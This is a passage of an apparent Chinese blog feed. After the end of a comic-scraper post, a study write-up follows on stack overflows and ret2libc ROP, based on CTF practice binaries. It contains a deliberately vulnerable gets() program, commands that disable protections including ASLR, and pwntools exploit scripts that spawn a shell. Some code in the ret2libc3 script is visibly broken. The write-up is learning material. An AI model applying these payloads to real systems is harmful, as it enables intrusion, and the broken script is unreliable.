class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> get_pic(browser,cururl,i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pics</span>(<span class="params">Comics</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据主页面获取的信息逐章爬取图片</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    comic_list=Comics[<span class="string">&#x27;urls&#x27;</span>]</span><br><span class="line">    basedir=Comics[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#desired_capabilities = DesiredCapabilities.FIREFOX</span></span><br><span class="line">    </span><br><span class="line">    browser=webdriver.Firefox(options=options)</span><br><span class="line">    <span class="comment">#desired_capabilities[&quot;pageLoadStrategy&quot;] = &quot;normal&quot;</span></span><br><span class="line">    curchap=<span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> comic_list:</span><br><span class="line">        curchap+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> curchap&lt;start_chap:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#打开某一章节页面</span></span><br><span class="line">        browser.get(url)</span><br><span class="line">        browser.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#获取标题</span></span><br><span class="line">            title=browser.title</span><br><span class="line">            <span class="comment">#获取页数</span></span><br><span class="line">            temptext=browser.find_element_by_xpath(<span class="string">&quot;//*[contains(text(),&#x27;共&#x27;)]&quot;</span>).text</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#在本地创建文件夹保存</span></span><br><span class="line">        dirname=basedir+<span class="string">&#x27;/&#x27;</span>+<span class="built_in">str</span>(title)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(dirname):</span><br><span class="line">            os.mkdir(dirname)</span><br><span class="line">        </span><br><span class="line">        pageNum=<span class="built_in">int</span>(re.findall(<span class="string">r&#x27;\d+&#x27;</span>,temptext)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        cururl=url</span><br><span class="line">        </span><br><span class="line">        pbar=tqdm(<span class="built_in">range</span>(pageNum))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> pbar:</span><br><span class="line">            cururl=get_pic(browser,cururl,dirname,i+<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">            pbar.set_description(<span class="string">&#x27;&#123;&#125;  &#x27;</span>.<span class="built_in">format</span>(title)+<span class="string">&#x27;共&#x27;</span>+<span class="built_in">str</span>(pageNum)+<span class="string">&#x27;页&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    browser.quit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;所有章节下载完毕&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Comics=get_TOF(indexurl)</span><br><span class="line">get_pics(Comics)</span><br></pre></td></tr></table></figure><p>速度还是不够快，但selenium模拟浏览器操作也没法快到哪里去，以后可以考虑换个框架</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn栈溢出的首次尝试和基本ROP</title>
      <link href="2020/11/19/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95/"/>
      <url>2020/11/19/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p><strong>模仿ctfwiki上实例进行首次pwn以及基本ROP的学习</strong></p><a id="more"></a><p>首先记录下手动复现实例的过程</p><h3 id="基础栈溢出"><a href="#基础栈溢出" class="headerlink" title="基础栈溢出"></a>基础栈溢出</h3><h4 id="构建c语言可执行文件"><a href="#构建c语言可执行文件" class="headerlink" title="构建c语言可执行文件"></a>构建c语言可执行文件</h4><p>代码如下,原文件保存为stack_example.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>终端输入命令如下，其中m32指生成32位程序，-fno-stack-protector指不开启堆栈溢出保护，-no-pie指关闭PIE：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example</span><br></pre></td></tr></table></figure><p>可以用checksec工具检查编译后的文件,命令和结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">checksec stack_example</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>这里简要介绍下各项保护机制：</p><ul><li>NX：通过现代操作系统内存保护单元MPU机制对内存页的权限进行设置，具体表现为可写权限与可执行权限互斥，gcc默认开启NX保护，可在编译时加入“-z execstack”参数关闭</li><li>Stack Canary：针对栈溢出攻击的保护，因为栈溢出要通过溢出覆盖函数栈高位的返回地址，因此要在返回地址前写入一个字长的随机数据，在函数返回前校验该值是否被改变。gcc默认开启Stack Canary保护，可在编译时加入“-fno-stack-protector”参数关闭</li><li>ASLR：将程序堆栈地址和动态链接库的加载地址进行一定的随机化，是系统等级的保护机制，关闭方法是修改<code>/proc/sys/kernel/randomize_va_space</code>为0，可使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭</li><li>PIE：类似于ASLR，将可执行程序ELF的地址进行随机化加载，可在编译时加入-no-pie”参数关闭</li></ul><h4 id="分析可执行文件结构"><a href="#分析可执行文件结构" class="headerlink" title="分析可执行文件结构"></a>分析可执行文件结构</h4><p>用IDA打开可执行文件进行分析，可以看到vulnerable函数反编译后如下图所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出字符串s距离ebp的长度为0x14,vulnerable函数对应的栈结构为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+   0x1C</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+   0x18</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+   0x14</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+   0</span><br></pre></td></tr></table></figure><p>同时可以用IDA获取success地址，为0x0804843B</p><p>由于gets会读到回车才结束，就可以直接读取任意长度字符串，若我们输入的字符串为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x18*&#39;a&#39;+success_addr</span><br></pre></td></tr></table></figure><p>即可将success_addr覆盖retaddr内容，让程序执行success函数的内容。</p><p>这里需要使用pwntools，具体python2脚本代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa=<span class="number">0x0804843B</span></span><br><span class="line">pre=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">in0=pre+p32(sa)</span><br><span class="line"></span><br><span class="line">sh.sendline(in0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>python3中由于bytes和string做了区分不能直接使用以上代码，暂时也没啥好的解决方案，暂时搁置。</p><p>在python2环境中运行以上脚本就可以看到success函数执行对应的输出。</p><hr><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>ROP，即返回地址导向编程，通常利用动态链接库和可执行文件中可利用的指令片段，这些片段均以ret指令结尾，被称为gadgets。ROP攻击需要满足两个条件：</p><ul><li>程序存在溢出，并可控制返回地址</li><li>找到满足条件的gadgets和对应的地址</li></ul><h4 id="示例一"><a href="#示例一" class="headerlink" title="示例一"></a>示例一</h4><p>文件来源：bamboofox的ret2libc1</p><p>首先检查文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/pwn$ file ret2libc1</span><br><span class="line">ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, not stripped</span><br><span class="line">ssr@ubuntu:~/pwn$ checksec ret2libc1</span><br><span class="line">[*] <span class="string">&#x27;/home/ssr/pwn/ret2libc1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位elf程序，开启了NX保护。</p><p>用IDA打开f5查看主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用了gets函数存在栈溢出。</p><p>首先确定可以控制的内存的起始地址距离main函数返回地址的字节数，需要开始调试，将断点下在<code>0x0804867E</code>即<code>call _gets</code>处，查看寄存器情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/pwn$ gdb ./ret2libc1</span><br><span class="line">pwndbg: loaded 190 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ./ret2libc1...done.</span><br><span class="line">gdb-peda$ b *0x0804867E</span><br><span class="line">Breakpoint 1 at 0x804867e: file ret2libc1.c, line 27.</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/ssr/pwn/ret2libc1 </span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line"></span><br><span class="line">省略部分内容</span><br><span class="line"></span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0xffffcf1c —▸ 0x8048312 ◂— pop    edi /* <span class="string">&#x27;__libc_start_main&#x27;</span> */</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb4870 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> ESI  0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> EBP  0xffffcf88 ◂— 0x0</span><br><span class="line"> ESP  0xffffcf00 —▸ 0xffffcf1c —▸ 0x8048312 ◂— pop    edi /* <span class="string">&#x27;__libc_start_main&#x27;</span> */</span><br><span class="line"> EIP  0x804867e (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以看到 esp 为 0xffffcf00 ，ebp 为 0xffffcf88，s的地址为 0xffffcf1c，所以s相对于 ebp 的偏移为0x6c，所以相对与返回地址的偏移为0x6c+4</p><p>在IDA中使用字符查找发现<code>/bin/sh</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rodata:08048720 aBinSh          db &#39;&#x2F;bin&#x2F;sh&#39;,0          ; DATA XREF: .data:shell↓o</span><br></pre></td></tr></table></figure><p>且找到函数<code>system</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048460 ; int system(const char *command)</span><br></pre></td></tr></table></figure><p>则可以直接返回该处执行system函数。脚本如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">binsh_adr= <span class="number">0x08048720</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(system_plt)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(binsh_adr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h4><p>文件来源：bamboofox的ret2libc2</p><p>栈溢出漏洞情况与示例一基本一致，偏移量同样是0x6c+4</p><p>可以找到函数system</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048490 ; int system(const char *command)</span><br></pre></td></tr></table></figure><p>但不存在字符串<code>/bin/sh</code>，所以需要手动读取字符串，所以需要两个gadgets，第一个控制程序读取字符串，第二个控制程序执行shellcode，然后在可写的bss段找到一个变量buf2用于存放两个控制程序的参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">buf2_adr= <span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(gets_plt)</span><br><span class="line">payload+=p32(system_plt)+p32(buf2_adr)+p32(buf2_adr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>此时栈溢出的分布为</p><ul><li>gets地址，覆盖了main函数的返回地址</li><li>system地址，同样是gets的返回地址</li><li>buf2地址，是gets的参数，同样是system的伪返回地址</li><li>buf2地址，是system的参数</li></ul><h4 id="示例三"><a href="#示例三" class="headerlink" title="示例三"></a>示例三</h4><p>文件来源：bamboofox的ret2libc3</p><p>与示例二相比没有system函数，因为system函数属于libc，而libc.so动态链接库中的函数之间的偏移是固定的，需要通过libc找到system函数地址</p><p>ELF文件中通常存在.GOT.PLT和.PLT两个特殊的节，ELF编译时无法知道libc等动态链接库的加载地址，若想要调动动态链接库的函数，就必须使用.GOT.PLT和.PLT配合完成调用。</p><p>如果在程序段中有call _printf,其实并不是跳转到了实际的 _printf 函数位置，而是跳转到了PLT表中的 _printf 项，同时.PLT表作为一段代码，会从内存中取出 _printf 的实际地址进行跳转，而.GOT.PLT就是存放这一实际地址的地方。</p><p>这里使用LibcSearcher工具，可以通过泄露已经执行过的libc函数地址查询system地址，可以到其<a href="https://github.com/lieanu/LibcSearcher">网站</a>下载。</p><p>首先要泄露 __libc_start_main 的地址,然后再次进入main函数获取shell，值得注意的是第二次进入main时相对偏移量变为了0x68</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">rc3=ELF(./retlibc3)</span><br><span class="line"></span><br><span class="line">main=rc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt=rc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_got=rc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用puts打印libc_plt后还要返回main</span></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(puts_plt)+p32(main)+p32(libc_got)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc_addr=u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>, libc_addr)</span><br><span class="line">system_addr=libc.dump(<span class="string">&quot;system&quot;</span>)+libc_addr</span><br><span class="line">binsh_addr=libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)+libc_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x68</span>)+p32(system_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(binsh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>下面来看一个稍微复杂攻击实例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用以下命令编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc rop.c -o rop -no-pie -fno-stack-protector</span><br></pre></td></tr></table></figure><p>与之前不同，这一程序没有预置的攻击函数，使用ROPgadget命令查找该程序中的Gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/pwn$ ROPgadget --binary rop</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004004c2 : adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x00000000004004c1 : adc byte ptr [rax], spl ; jmp rax</span><br><span class="line">0x00000000004004be : adc dword ptr [rbp - 0x41], ebx ; adc byte ptr [rax], spl ; jmp rax</span><br><span class="line">0x0000000000400457 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x400424</span><br><span class="line">0x00000000004005ff : add bl, dh ; ret</span><br><span class="line">0x00000000004005fd : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000004005fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x0000000000400437 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x400424</span><br><span class="line">0x000000000040058a : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x00000000004004cc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004005fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x000000000040058b : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class="line">0x0000000000400413 : add byte ptr [rax], al ; add rsp, 8 ; ret</span><br><span class="line">0x0000000000400439 : add byte ptr [rax], al ; jmp 0x400422</span><br><span class="line">0x000000000040058c : add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x00000000004004ce : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004005fe : add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000400548 : add byte ptr [rbp + 5], dh ; jmp 0x4004e3</span><br><span class="line">0x0000000000400538 : add byte ptr [rcx], al ; ret</span><br><span class="line">0x000000000040058d : add cl, cl ; ret</span><br><span class="line">0x00000000004005e0 : add dword ptr [rax + 0x39], ecx ; jmp 0x40065d</span><br><span class="line">0x0000000000400447 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x400424</span><br><span class="line">0x0000000000400534 : add eax, 0x200b06 ; add ebx, esi ; ret</span><br><span class="line">0x0000000000400539 : add ebx, esi ; ret</span><br><span class="line">0x0000000000400416 : add esp, 8 ; ret</span><br><span class="line">0x0000000000400415 : add rsp, 8 ; ret</span><br><span class="line">0x0000000000400537 : and byte ptr [rax], al ; add ebx, esi ; ret</span><br><span class="line">0x0000000000400434 : and byte ptr [rax], al ; push 0 ; jmp 0x400427</span><br><span class="line">0x0000000000400444 : and byte ptr [rax], al ; push 1 ; jmp 0x400427</span><br><span class="line">0x0000000000400454 : and byte ptr [rax], al ; push 2 ; jmp 0x400427</span><br><span class="line">0x0000000000400565 : call qword ptr [rbp + 0x48]</span><br><span class="line">0x000000000040055e : call rax</span><br><span class="line">0x0000000000400546 : cmp dword ptr [rdi], 0 ; jne 0x400555 ; jmp 0x4004e5</span><br><span class="line">0x0000000000400545 : cmp qword ptr [rdi], 0 ; jne 0x400556 ; jmp 0x4004e6</span><br><span class="line">0x0000000000400442 : fimul dword ptr [rbx] ; and byte ptr [rax], al ; push 